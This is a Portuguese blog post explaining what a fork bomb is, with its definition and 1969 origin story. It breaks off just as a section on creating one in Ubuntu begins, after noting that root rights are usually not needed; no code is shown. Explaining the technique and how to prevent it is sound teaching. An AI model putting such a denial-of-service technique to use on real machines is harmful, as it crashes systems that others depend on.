<!DOCTYPE html>
<html lang="pt-BR" class="no-js">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="http://gmpg.org/xfn/11">
	<link rel="pingback" href="https://elias.praciano.com/xmlrpc.php">
	<!--[if lt IE 9]>
	<script src="https://elias.praciano.com/wp-content/themes/twentyfifteen/js/html5.js"></script>
	<![endif]-->
	<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
<title>O que é uma fork bomb? &#8211; Elias Praciano</title>
<link rel='dns-prefetch' href='//s0.wp.com' />
<link rel='dns-prefetch' href='//secure.gravatar.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
<link rel="alternate" type="application/rss+xml" title="Feed para Elias Praciano &raquo;" href="https://elias.praciano.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Feed de comentários para Elias Praciano &raquo;" href="https://elias.praciano.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Feed de comentários para Elias Praciano &raquo; O que é uma fork bomb?" href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.4\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/elias.praciano.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56692,8205,9792,65039],[55357,56692,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='twentyfifteen-jetpack-css'  href='https://elias.praciano.com/wp-content/plugins/jetpack/modules/theme-tools/compat/twentyfifteen.css?ver=5.8' type='text/css' media='all' />
<link rel='stylesheet' id='twentyfifteen-fonts-css'  href='https://fonts.googleapis.com/css?family=Noto+Sans%3A400italic%2C700italic%2C400%2C700%7CNoto+Serif%3A400italic%2C700italic%2C400%2C700%7CInconsolata%3A400%2C700&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='genericons-css'  href='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/genericons/genericons/genericons.css?ver=3.1' type='text/css' media='all' />
<link rel='stylesheet' id='twentyfifteen-style-css'  href='https://elias.praciano.com/wp-content/themes/twentyfifteen/style.css?ver=4.9.4' type='text/css' media='all' />
<style id='twentyfifteen-style-inline-css' type='text/css'>

			.post-navigation .nav-previous { background-image: url(https://i2.wp.com/elias.praciano.com/wp-content/uploads/2014/11/tilda-feat300x200.jpg?resize=100%2C50&#038;ssl=1); }
			.post-navigation .nav-previous .post-title, .post-navigation .nav-previous a:hover .post-title, .post-navigation .nav-previous .meta-nav { color: #fff; }
			.post-navigation .nav-previous a:before { background-color: rgba(0, 0, 0, 0.4); }
		
			.post-navigation .nav-next { background-image: url(https://i1.wp.com/elias.praciano.com/wp-content/uploads/2014/11/fork_bomb-prevent-feat300x200.jpg?resize=100%2C50&#038;ssl=1); border-top: 0; }
			.post-navigation .nav-next .post-title, .post-navigation .nav-next a:hover .post-title, .post-navigation .nav-next .meta-nav { color: #fff; }
			.post-navigation .nav-next a:before { background-color: rgba(0, 0, 0, 0.4); }
		

		/* Custom Header Background Color */
		body:before,
		.site-header {
			background-color: #98a5b5;
		}

		@media screen and (min-width: 59.6875em) {
			.site-header,
			.secondary {
				background-color: transparent;
			}

			.widget button,
			.widget input[type="button"],
			.widget input[type="reset"],
			.widget input[type="submit"],
			.widget_calendar tbody a,
			.widget_calendar tbody a:hover,
			.widget_calendar tbody a:focus {
				color: #98a5b5;
			}
		}
	

		/* Custom Sidebar Text Color */
		.site-title a,
		.site-description,
		.secondary-toggle:before {
			color: #ffffff;
		}

		.site-title a:hover,
		.site-title a:focus {
			color: #ffffff; /* Fallback for IE7 and IE8 */
			color: rgba( 255, 255, 255, 0.7);
		}

		.secondary-toggle {
			border-color: #ffffff; /* Fallback for IE7 and IE8 */
			border-color: rgba( 255, 255, 255, 0.1);
		}

		.secondary-toggle:hover,
		.secondary-toggle:focus {
			border-color: #ffffff; /* Fallback for IE7 and IE8 */
			border-color: rgba( 255, 255, 255, 0.3);
		}

		.site-title a {
			outline-color: #ffffff; /* Fallback for IE7 and IE8 */
			outline-color: rgba( 255, 255, 255, 0.3);
		}

		@media screen and (min-width: 59.6875em) {
			.secondary a,
			.dropdown-toggle:after,
			.widget-title,
			.widget blockquote cite,
			.widget blockquote small {
				color: #ffffff;
			}

			.widget button,
			.widget input[type="button"],
			.widget input[type="reset"],
			.widget input[type="submit"],
			.widget_calendar tbody a {
				background-color: #ffffff;
			}

			.textwidget a {
				border-color: #ffffff;
			}

			.secondary a:hover,
			.secondary a:focus,
			.main-navigation .menu-item-description,
			.widget,
			.widget blockquote,
			.widget .wp-caption-text,
			.widget .gallery-caption {
				color: rgba( 255, 255, 255, 0.7);
			}

			.widget button:hover,
			.widget button:focus,
			.widget input[type="button"]:hover,
			.widget input[type="button"]:focus,
			.widget input[type="reset"]:hover,
			.widget input[type="reset"]:focus,
			.widget input[type="submit"]:hover,
			.widget input[type="submit"]:focus,
			.widget_calendar tbody a:hover,
			.widget_calendar tbody a:focus {
				background-color: rgba( 255, 255, 255, 0.7);
			}

			.widget blockquote {
				border-color: rgba( 255, 255, 255, 0.7);
			}

			.main-navigation ul,
			.main-navigation li,
			.secondary-toggle,
			.widget input,
			.widget textarea,
			.widget table,
			.widget th,
			.widget td,
			.widget pre,
			.widget li,
			.widget_categories .children,
			.widget_nav_menu .sub-menu,
			.widget_pages .children,
			.widget abbr[title] {
				border-color: rgba( 255, 255, 255, 0.1);
			}

			.dropdown-toggle:hover,
			.dropdown-toggle:focus,
			.widget hr {
				background-color: rgba( 255, 255, 255, 0.1);
			}

			.widget input:focus,
			.widget textarea:focus {
				border-color: rgba( 255, 255, 255, 0.3);
			}

			.sidebar a:focus,
			.dropdown-toggle:focus {
				outline-color: rgba( 255, 255, 255, 0.3);
			}
		}
	
</style>
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentyfifteen-ie-css'  href='https://elias.praciano.com/wp-content/themes/twentyfifteen/css/ie.css?ver=20141010' type='text/css' media='all' />
<![endif]-->
<!--[if lt IE 8]>
<link rel='stylesheet' id='twentyfifteen-ie7-css'  href='https://elias.praciano.com/wp-content/themes/twentyfifteen/css/ie7.css?ver=20141010' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='jetpack-authors-widget-css'  href='https://elias.praciano.com/wp-content/plugins/jetpack/modules/widgets/authors/style.css?ver=20161228' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css'  href='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack_css-css'  href='https://elias.praciano.com/wp-content/plugins/jetpack/css/jetpack.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='https://elias.praciano.com/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='https://elias.praciano.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type='text/javascript' src='https://elias.praciano.com/wp-content/plugins/jetpack/_inc/build/related-posts/related-posts.min.js?ver=20150408'></script>
<link rel='https://api.w.org/' href='https://elias.praciano.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://elias.praciano.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://elias.praciano.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Como instalar o emulador de terminal drop-down Tilda.' href='https://elias.praciano.com/2014/11/como-instalar-o-emulador-de-terminal-drop-down-tilda/' />
<link rel='next' title='Como se prevenir de fork bombs no Linux, usando nproc e ulimit' href='https://elias.praciano.com/2014/11/como-se-prevenir-de-fork-bombs/' />
<meta name="generator" content="WordPress 4.9.4" />
<link rel="canonical" href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/" />
<link rel='shortlink' href='https://wp.me/p3TChl-uf' />
<link rel="alternate" type="application/json+oembed" href="https://elias.praciano.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Felias.praciano.com%2F2014%2F11%2Fo-que-e-uma-fork-bomb%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://elias.praciano.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Felias.praciano.com%2F2014%2F11%2Fo-que-e-uma-fork-bomb%2F&#038;format=xml" />

<link rel='dns-prefetch' href='//v0.wordpress.com'/>
<link rel='dns-prefetch' href='//widgets.wp.com'/>
<link rel='dns-prefetch' href='//s0.wp.com'/>
<link rel='dns-prefetch' href='//0.gravatar.com'/>
<link rel='dns-prefetch' href='//1.gravatar.com'/>
<link rel='dns-prefetch' href='//2.gravatar.com'/>
<link rel='dns-prefetch' href='//i0.wp.com'/>
<link rel='dns-prefetch' href='//i1.wp.com'/>
<link rel='dns-prefetch' href='//i2.wp.com'/>
<meta name="description" content="Neste post, vou mostrar como funcionam as fork bombs, como fazer uma e como se prevenir deste tipo de código malicioso. Além das diversas definições, sempre há uma história por ser contada e é por onde vou começar. Ao final do texto, há alguns links para outros sites onde o assunto também é abordado, caso&hellip;" />
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #ffffff; }
</style>

<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="O que é uma fork bomb?" />
<meta property="og:url" content="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/" />
<meta property="og:description" content="Neste post, vou mostrar como funcionam as fork bombs, como fazer uma e como se prevenir deste tipo de código malicioso. Além das diversas definições, sempre há uma história por ser contada e é por …" />
<meta property="article:published_time" content="2014-11-14T17:26:31+00:00" />
<meta property="article:modified_time" content="2016-10-31T13:46:48+00:00" />
<meta property="og:site_name" content="Elias Praciano" />
<meta property="og:image" content="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/forkbomb_feat300x200.jpg?fit=300%2C200&amp;ssl=1" />
<meta property="og:image:width" content="300" />
<meta property="og:image:height" content="200" />
<meta property="og:locale" content="pt_BR" />
<meta name="twitter:site" content="@coisasdogeek" />
<meta name="twitter:text:title" content="O que é uma fork bomb?" />
<meta name="twitter:card" content="summary" />
<style type="text/css" id="syntaxhighlighteranchor"></style>
<link rel="icon" href="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2015/11/cropped-coisasdogeek-blue-512.png?fit=32%2C32&#038;ssl=1" sizes="32x32" />
<link rel="icon" href="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2015/11/cropped-coisasdogeek-blue-512.png?fit=192%2C192&#038;ssl=1" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2015/11/cropped-coisasdogeek-blue-512.png?fit=180%2C180&#038;ssl=1" />
<meta name="msapplication-TileImage" content="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2015/11/cropped-coisasdogeek-blue-512.png?fit=270%2C270&#038;ssl=1" />
			<link rel="stylesheet" type="text/css" id="wp-custom-css" href="https://elias.praciano.com/?custom-css=6e1f367913" />
		</head>

<body class="post-template-default single single-post postid-1875 single-format-standard custom-background">
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Pular para o conteúdo</a>

	<div id="sidebar" class="sidebar">
		<header id="masthead" class="site-header" role="banner">
			<div class="site-branding">
										<p class="site-title"><a href="https://elias.praciano.com/" rel="home">Elias Praciano</a></p>
											<p class="site-description">850+ Tutoriais e análises</p>
									<button class="secondary-toggle">Menu e widgets</button>
			</div><!-- .site-branding -->
		</header><!-- .site-header -->

			<div id="secondary" class="secondary">

		
		
					<div id="widget-area" class="widget-area" role="complementary">
				<aside id="blog_subscription-2" class="widget jetpack_subscription_widget"><h2 class="widget-title">Não perca o próximo post!</h2>
			<form action="#" method="post" accept-charset="utf-8" id="subscribe-blog-blog_subscription-2">
				<div id="subscribe-text"><p>Assine o blog, para ser avisado:</p>
</div>					<p id="subscribe-email">
						<label id="jetpack-subscribe-label" for="subscribe-field-blog_subscription-2">
							seu e-mail						</label>
						<input type="email" name="email" required="required" class="required" value="" id="subscribe-field-blog_subscription-2" placeholder="seu e-mail" />
					</p>

					<p id="subscribe-submit">
						<input type="hidden" name="action" value="subscribe" />
						<input type="hidden" name="source" value="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/" />
						<input type="hidden" name="sub-type" value="widget" />
						<input type="hidden" name="redirect_fragment" value="blog_subscription-2" />
												<input type="submit" value="Assinar" name="jetpack_subscriptions_widget" />
					</p>
							</form>

			<script>
			/*
			Custom functionality for safari and IE
			 */
			(function( d ) {
				// In case the placeholder functionality is available we remove labels
				if ( ( 'placeholder' in d.createElement( 'input' ) ) ) {
					var label = d.querySelector( 'label[for=subscribe-field-blog_subscription-2]' );
						label.style.clip 	 = 'rect(1px, 1px, 1px, 1px)';
						label.style.position = 'absolute';
						label.style.height   = '1px';
						label.style.width    = '1px';
						label.style.overflow = 'hidden';
				}

				// Make sure the email value is filled in before allowing submit
				var form = d.getElementById('subscribe-blog-blog_subscription-2'),
					input = d.getElementById('subscribe-field-blog_subscription-2'),
					handler = function( event ) {
						if ( '' === input.value ) {
							input.focus();

							if ( event.preventDefault ){
								event.preventDefault();
							}

							return false;
						}
					};

				if ( window.addEventListener ) {
					form.addEventListener( 'submit', handler, false );
				} else {
					form.attachEvent( 'onsubmit', handler );
				}
			})( document );
			</script>
				
</aside><aside id="rss_links-2" class="widget widget_rss_links"><p><a target="_self" href="https://elias.praciano.com/feed/" title="Assinar Posts"><img src="https://elias.praciano.com/wp-content/plugins/jetpack/images/rss/silver-small.png" alt="RSS Feed" /></a>&nbsp;<a target="_self" href="https://elias.praciano.com/feed/" title="Assinar Posts">RSS - Posts</a></p>
</aside><aside id="wpcom_social_media_icons_widget-3" class="widget widget_wpcom_social_media_icons_widget"><h2 class="widget-title">Me acompanhe nas redes!</h2><ul><li><a href="https://www.facebook.com/eliaspracianosite/" class="genericon genericon-facebook" target="_blank"><span class="screen-reader-text">Ver perfil de eliaspracianosite no Facebook</span></a></li><li><a href="https://twitter.com/coisasdogeek/" class="genericon genericon-twitter" target="_blank"><span class="screen-reader-text">Ver perfil de coisasdogeek no Twitter</span></a></li><li><a href="https://www.instagram.com/epraciano/" class="genericon genericon-instagram" target="_blank"><span class="screen-reader-text">Ver perfil de epraciano no Instagram</span></a></li><li><a href="https://www.youtube.com/user/Eliaspraciano/" class="genericon genericon-youtube" target="_blank"><span class="screen-reader-text">Ver perfil de Eliaspraciano no YouTube</span></a></li><li><a href="https://plus.google.com/u/0/+eliaspraciano/" class="genericon genericon-googleplus" target="_blank"><span class="screen-reader-text">Ver perfil de eliaspraciano no Google+</span></a></li><li><a href="https://www.flickr.com/photos/eliaspraciano/" class="genericon genericon-flickr" target="_blank"><span class="screen-reader-text">Ver perfil de eliaspraciano no Flickr</span></a></li><li><a href="https://profiles.wordpress.org/eliaspraciano/" class="genericon genericon-wordpress" target="_blank"><span class="screen-reader-text">Ver perfil de eliaspraciano no WordPress.org</span></a></li></ul></aside><aside id="custom_html-2" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><!-- SCRIPT BANNER CLICKIO - INI -->
<script type="text/javascript" src="http://www.google.com.br/coop/cse/brand?form=cse-search-box&lang=pt"></script>
<script async type='text/javascript' src='//s.clickiocdn.com/t/common_258.js'></script>
<script class='__lxGc__' type='text/javascript'>
((__lxGc__=window.__lxGc__||{'s':{},'b':0})['s']['_209398']=__lxGc__['s']['_209398']||{'b':{}})['b']['_611049']={'i':__lxGc__.b++};
</script>
<!-- SCRIPT BANNER CLICKIO - FIM -->
<!-- 300x250 CLICKIO - INI -->
<script async type='text/javascript' src='//s.clickiocdn.com/t/common_258.js'></script>
<script class='__lxGc__' type='text/javascript'>
((__lxGc__=window.__lxGc__||{'s':{},'b':0})['s']['_209398']=__lxGc__['s']['_209398']||{'b':{}})['b']['_611071']={'i':__lxGc__.b++};
</script>
<!-- 300x250 DO CLICKIO - FIM -->
<!-- 300x250 left side bar - INI -->
<script async type='text/javascript' src='//s.clickiocdn.com/t/common_258.js'></script>
<script class='__lxGc__' type='text/javascript'>
((__lxGc__=window.__lxGc__||{'s':{},'b':0})['s']['_209398']=__lxGc__['s']['_209398']||{'b':{}})['b']['_613724']={'i':__lxGc__.b++};
</script>
<!-- 300x250 left side bar - END -->
<!-- 300x600 Sticky Banner - INI -->
<script async type='text/javascript' src='//s.clickiocdn.com/t/common_258.js'></script>
<script class='__lxGc__' type='text/javascript'>
((__lxGc__=window.__lxGc__||{'s':{},'b':0})['s']['_209398']=__lxGc__['s']['_209398']||{'b':{}})['b']['_613731']={'i':__lxGc__.b++};
</script>
<!-- 300x600 Sticky Banner - END --></div></aside><aside id="custom_html-3" class="widget_text widget widget_custom_html"><h2 class="widget-title">Pesquisa personalizada</h2><div class="textwidget custom-html-widget"><form id="cse-search-box" action="http://www.google.com.br">
<div><input name="cx" type="hidden" value="partner-pub-4471688302049934:4211079200" />
<input name="ie" type="hidden" value="UTF-8" />
<input name="q" size="55" type="text" />
<input name="sa" type="submit" value="Buscar" /></div>
</form></div></aside><aside id="search-5" class="widget widget_search"><h2 class="widget-title">Pesquisa WordPress</h2><form role="search" method="get" class="search-form" action="https://elias.praciano.com/">
				<label>
					<span class="screen-reader-text">Pesquisar por:</span>
					<input type="search" class="search-field" placeholder="Pesquisar &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit screen-reader-text" value="Pesquisar" />
			</form></aside><aside id="authors-2" class="widget widget_authors"><h2 class="widget-title">O que tá rolando aqui:</h2><ul><li><a href="https://elias.praciano.com/author/budspencer/"> <img alt="1" src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" class="avatar avatar-48 photo" height="48" width="48" data-lazy-src="https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=48&#038;d=monsterid&#038;r=g" data-lazy-srcset="https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=96&#038;d=monsterid&#038;r=g 2x"><noscript><img alt='1' src='https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=48&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/b9ad122d7c325ffddbf3542dcbc704b4?s=96&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' /></noscript> <strong>Elias Praciano</strong></a><ul><li><a href="https://elias.praciano.com/2018/02/gimp-vs-photoshop-qual-o-melhor-editor-de-imagens-para-voce/">Gimp vs Photoshop: Qual o melhor editor de imagens para você?</a></li></ul></li></ul></aside>			</div><!-- .widget-area -->
		
	</div><!-- .secondary -->

	</div><!-- .sidebar -->

	<div id="content" class="site-content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
<article id="post-1875" class="post-1875 post type-post status-publish format-standard has-post-thumbnail hentry category-programacao category-tutoriais category-ubuntu-2 tag-bash tag-c tag-dos tag-fork-bomb tag-perl tag-python tag-seguranca tag-sistemas-operacionais">
	
	<div class="post-thumbnail">
		<img width="100" height="50" src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" data-attachment-id="1878" data-permalink="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/forkbomb_feat300x200/" data-orig-file="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/forkbomb_feat300x200.jpg?fit=300%2C200&amp;ssl=1" data-orig-size="300,200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="forkbomb_feat300x200" data-image-description="" data-medium-file="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/forkbomb_feat300x200.jpg?fit=300%2C200&amp;ssl=1" data-large-file="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/forkbomb_feat300x200.jpg?fit=300%2C200&amp;ssl=1" data-lazy-src="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/forkbomb_feat300x200.jpg?resize=100%2C50&amp;ssl=1" data-lazy-srcset="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/forkbomb_feat300x200.jpg?resize=100%2C50&amp;ssl=1 100w, https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/forkbomb_feat300x200.jpg?zoom=2&amp;resize=100%2C50&amp;ssl=1 200w, https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/forkbomb_feat300x200.jpg?zoom=3&amp;resize=100%2C50&amp;ssl=1 300w" data-lazy-sizes="(max-width: 100px) 100vw, 100px" />	</div><!-- .post-thumbnail -->

	
	<header class="entry-header">
		<h1 class="entry-title">O que é uma fork bomb?</h1>	</header><!-- .entry-header -->

	<div class="entry-content">
		<p>Neste post, vou mostrar como funcionam as fork bombs, como fazer uma e como se prevenir deste tipo de código malicioso.<br />
Além das diversas definições, sempre há uma história por ser contada e é por onde vou começar.<br />
Ao final do texto, há alguns links para outros sites onde o assunto também é abordado, caso você queira se aprofundar mais no assunto.<br />
<a href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/bugselmer/#main" rel="attachment wp-att-1877"><img data-attachment-id="1877" data-permalink="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/bugselmer/" data-orig-file="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2014/11/bugselmer.jpg?fit=300%2C225&amp;ssl=1" data-orig-size="300,225" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="bugselmer" data-image-description="&lt;p&gt;Pernalonga e Elmer Fudd&lt;/p&gt;
" data-medium-file="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2014/11/bugselmer.jpg?fit=300%2C225&amp;ssl=1" data-large-file="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2014/11/bugselmer.jpg?fit=300%2C225&amp;ssl=1" src="https://elias.praciano.com/wp-content/plugins/jetpack/modules/lazy-images/images/1x1.trans.gif" alt="Pernalonga e Elmer Fudd" width="300" height="225" class="aligncenter size-full wp-image-1877" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2014/11/bugselmer.jpg?resize=300%2C225&#038;ssl=1"><noscript><img data-attachment-id="1877" data-permalink="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/bugselmer/" data-orig-file="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2014/11/bugselmer.jpg?fit=300%2C225&amp;ssl=1" data-orig-size="300,225" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="bugselmer" data-image-description="&lt;p&gt;Pernalonga e Elmer Fudd&lt;/p&gt;
" data-medium-file="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2014/11/bugselmer.jpg?fit=300%2C225&amp;ssl=1" data-large-file="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2014/11/bugselmer.jpg?fit=300%2C225&amp;ssl=1" src="https://i2.wp.com/elias.praciano.com/wp-content/uploads/2014/11/bugselmer.jpg?resize=300%2C225&#038;ssl=1" alt="Pernalonga e Elmer Fudd" width="300" height="225" class="aligncenter size-full wp-image-1877" data-recalc-dims="1" /></noscript></a><br />
Se o seu interesse é prevenção, leia <a href="https://elias.praciano.com/2014/11/como-se-prevenir-de-fork-bombs/" target="_blank">Como prevenir a execução de uma fork bomb no seu sistema</a>.</p>
<h2>Qual a definição de fork bomb?</h2>
<p>Uma definição simples para fork bomb é a de que se trata de um código que tenha a função e a capacidade de se replicar indefinidamente.<br />
Vírus e vermes não valem para esta definição.<br />
À medida em que o código vai auto replicando, consome cada vez mais recursos de memória, de processamento etc.<br />
Como os recursos do sistema não são inesgotáveis, o resultado é que ele entra em colapso.<br />
Há relatos de que códigos deste tipo foram executados por estudantes, na Universidade de Washington, em um Burroughs 5500, em 1969 &mdash; o programa fazia 2 cópias de si mesmo, a cada vez em que era executado até que o sistema fosse derrubado.<br />
A esta rápida reprodução do código deve-se o apelido de &#8220;trabalho de coelho&#8221; (<em>rabbit job</em>) ou <em>wabbit</em>, em alusão ao personagem da Looney Tunes, Elmer Fudd, que trocava o R pelo L (veja link ao final do texto) &mdash; a piada só tem graça em inglês.</p>
<h2>Como criar uma fork bomb no Ubuntu</h2>
<p>Você não precisa ser super usuário para criar e rodar uma fork bomb na maioria das vezes. Normalmente, cabe ao administrador do sistema regular como cada usuário irá usar os recursos.<br />
<a href="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/error/#main" rel="attachment wp-att-1876"><img data-attachment-id="1876" data-permalink="https://elias.praciano.com/2014/11/o-que-e-uma-fork-bomb/error/" data-orig-file="https://i0.wp.com/elias.praciano.com/wp-content/uploads/2014/11/error.png?fit=48%2C48&amp;ssl=1" data-orig-size="48,48" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="error" data-image-description="&lt;p&gt;Perigo!&lt;/p&gt;
